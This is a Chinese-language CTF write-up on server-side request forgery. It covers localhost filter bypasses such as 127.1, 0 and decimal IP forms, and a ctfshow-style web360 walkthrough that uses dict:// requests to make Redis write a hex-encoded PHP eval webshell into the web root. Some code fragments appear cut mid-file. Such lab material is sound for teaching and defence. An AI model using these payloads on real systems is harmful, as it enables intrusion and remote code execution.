CTF 秀 - SSRF

1. 认识 SSRF

SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）

SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

    } else {
        die('hacker');
    }
} else {
    die('hacker');
}
?>

parse_url() 解析请求包的参数，返回数组，scheme是请求包的协议

  • 127.1 会被解析成 127.0.0.1，也就意味着为零可缺省
  • 在 Linux 中，0 也会被解析成 127.0.0.1
  • 127.0.0.0/8 是一个环回地址网段，从 127.0.0.1 ~ 127.255.255.254 都表示 localhost
  • ip 地址还可以通过表示成其他进制的形式访问，IP地址二进制、十进制、十六进制互换

payload

[POST]
url=http://127.1/flag.php
url=http://0/flag.php
url=http://127.255.255.254/flag.php
url=http://2130706433/flag.php

直接给出了源代码

<?php

$x = parse_url($url);
if ($x['scheme'] === 'http' || $x['scheme'] === 'https') {
    $ip = gethostbyname($x['host']);
    echo '</br>' . $ip . '</br>';
    if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
        die('ip!');
    }
    echo file_get_contents($_POST['url']);
} else {
    die('scheme');
}

if 判断中的内容

FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP
FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP
FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）
FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。

10. web360

ssrf打redis，基本上四种攻击方式：

  • 写webshell
  • 写ssh公钥
  • 写contrab计划任务反弹shell
  • 主从复制

Gopherus 攻击 Redis

先使用 dict 进行手打

探测是否需要认证

[POST]
url=dict://127.0.0.1:6379/info

需要的话使用 dict://127.0.0.1:6379/auth:xxx 爆破一下

设置 redis 的工作路径用于保存数据

[POST]
url=dict://127.0.0.1:6379/config:set:dir:/var/www/html/

设置保存文件名

[POST]
url=dict://127.0.0.1:6379/config:set:dbfilename:shell.php

使用十六进制写入 shell

[POST]
url=dict://127.0.0.1:6379/set:shell:"\x3c\x3f\x70\x68\x70\x20\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x30\x5d\x29\x3b\x3f\x3e"

保存 shell 到文件中

[POST]
url=dict://127.0.0.1:6379/save

访问 shell.php 获得 shell

也可以使用 gopherus 生成 payload 一样将后面的部分进行 URL 编码
